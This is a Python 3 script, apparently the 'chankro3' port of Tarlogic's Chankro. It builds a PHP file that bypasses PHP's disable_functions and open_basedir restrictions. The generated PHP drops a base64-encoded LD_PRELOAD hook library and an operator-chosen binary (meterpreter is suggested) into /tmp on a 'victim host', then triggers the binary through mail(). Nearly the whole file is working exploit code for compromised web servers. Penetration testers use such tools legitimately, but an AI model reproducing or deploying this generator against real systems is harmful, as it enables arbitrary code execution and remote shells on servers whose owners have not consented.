#!/usr/bin/env python3
import argparse
import base64
import pathlib
import typing
from posixpath import join as urljoin

BASE_PATH = pathlib.Path(__file__).parent


def add_arguments() -> argparse.Namespace:
    """Adds all arguments for chanko3"""
    description = """
Generates PHP script to exploit disable_function and open_basedir

This version is a bit more customisable and for Python 3! You can find more info at:
Author: Richard Schwabe
Github: https://github.com/richardschwabe/chankro3

Original was for python2 you can find it here:
Author:   TarlogicSecurity
Original: https://github.com/TarlogicSecurity/Chankro
"""
    parser = argparse.ArgumentParser(
        description=description, formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "-a",
        "--arch",
        dest="arch",
        default="32",
        choices=["32", "64"],
        help="x86 or x64 Architecture, Default: 32",
    )
    parser.add_argument(
        "-p",
        "--payload",
        dest="payload",
        help="Binary to be executed (p.e. meterpreter)",
    )
    parser.add_argument(
        "-o",
        "--output",
        dest="output",
        default="chankro3.php",
        help="Output PHP filename, Default:chankro3.php",
    )
    parser.add_argument(
        "-r",
        "--remote",
        dest="remote_path",
        default="/tmp",
        help="Absolute Path on Victim Host, Default: /tmp",
    )
    parser.add_argument(
        "-n",
        "--name",
        dest="custom_name",
        default="chankro3.so",
        help="Custom name for remote chankro3 file, Default: chankro3.so ",
    )
    return parser.parse_args()


def check_args(args) -> typing.Tuple[bool, str, str]:
    """Checks if the input and output paths are OK"""
    check_ok = False
    input_file_path = pathlib.Path(args.payload)
    output_file_path = pathlib.Path(args.output)
    if input_file_path.exists():
        check_ok = True
    if not output_file_path.parent.exists():
        output_file_path.parent.mkdir(exist_ok=True, parents=True)
    return check_ok, input_file_path, output_file_path


def create_php_string(
    remote_path: str,
    encoded_shell: str,
    encoded_hook_file: str,
    custom_name: str = "chankro3.so",
) -> str:
    """
    Returns the final PHP Code that will be written to the specified output file.
    """

    if not custom_name:
        print("[!] Please check --name.")
        exit(1)

    validated_remote_path_file = urljoin(remote_path, custom_name)

    # https://github.com/TarlogicSecurity/Chankro/pull/10
    multibyte_send_mail = "{ mb_send_mail('a','a','a','a'); }"

    return f"""
<?php
$hook = '{encoded_hook_file}';
$meterpreter = '{encoded_shell}';
file_put_contents('{validated_remote_path_file}', base64_decode($hook));
file_put_contents('{remote_path}/acpid.socket', base64_decode($meterpreter));
putenv('CHANKRO={remote_path}/acpid.socket');
putenv('LD_PRELOAD={validated_remote_path_file}');
$m_res = mail('a','a','a','a');
if(!$m_res) {multibyte_send_mail};
?>
"""


def show_help_message() -> None:
    """Shows Help message and exits the application"""
    print(
        "[!] Please provide: --payload --output --remote or use --help to learn more."
    )
    exit(1)


def run(args):
    if not args.payload or not args.output or not args.remote_path:
        show_help_message()

    check_ok, input_file_path, output_file_path = check_args(args)
    if not check_ok:
        show_help_message()

    # Read Input file:
    encoded_shell = None
    with open(input_file_path, "rb") as file:
        encoded_shell = base64.b64encode(file.read()).decode("ascii")

    if not encoded_shell:
        show_help_message()

    # Get the correct architecture file
    arch_file = BASE_PATH / "hook32.so"
    if args.arch == "64":
        arch_file = BASE_PATH / "hook64.so"

    encoded_hook_file = None
    with open(arch_file, "rb") as hook_file:
        encoded_hook_file = base64.b64encode(hook_file.read()).decode("ascii")

    if not encoded_hook_file:
        show_help_message()

    # Put everything together
    final_php_payload = create_php_string(
        args.remote_path, encoded_shell, encoded_hook_file, custom_name=args.custom_name
    )

    with open(output_file_path, "w") as output_file:
        output_file.write(final_php_payload)

    print("[+] File created!")


if __name__ == "__main__":
    args = add_arguments()
    run(args)
